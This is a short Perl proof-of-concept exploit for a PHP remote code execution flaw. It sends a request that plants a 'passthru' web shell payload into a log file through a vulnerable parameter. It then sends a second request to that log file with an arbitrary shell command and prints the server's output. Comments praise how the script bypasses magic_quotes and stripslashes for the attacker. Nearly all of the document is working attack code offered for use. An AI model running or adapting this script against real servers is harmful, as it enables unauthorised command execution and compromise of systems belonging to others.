#!/usr/bin/perl
#Php Endangers - Remote Code Execution
#POC To inject and execute a malicious request, probably spawning and executing a shell command

use LWP::Simple;
use LWP::UserAgent;

sub header(){
print "--------------------------------------------------------------------------
Usage <target> <vulnerable file> <variable> <log file> <shell command>
Example roc.pl 127.0.0.1 info.php msg errorlog.php \"ls -la\"
--------------------------------------------------------------------------"
}

$injection = "<?php passthru(\$\_GET\[cmd\])\; ?>";

#You may notice some additional funcs used to inject, these are to execute and produce 99% successful result
#it would help and bypass magic_quotes func and stripslashes too, that would possibly of lot good to the attacker!

if(@ARGV !=5){ header(); exit; }

$target = @ARGV[0];
$file = @ARGV[1];
$var = @ARGV[2];
$log = @ARGV[3];
$command = @ARGV[4];

$agent = LWP::UserAgent->new();

$exec = "http://$target/$file?$var=$injection";
print "$exec\n\n";
$agent->get("$exec");

$exec2 = "http://$target/$log?cmd=$command";
print "$exec2\n\n";
$response = $agent->get("$exec2");

if ($response->is_success){
	print $response->decoded_content;
}
else {
	die "Host Seems Down";
}

#REMOTE CODE EXECUTION
#An explanation POC for exploiting the roc(Remote CODE Execution) Vulnerability.
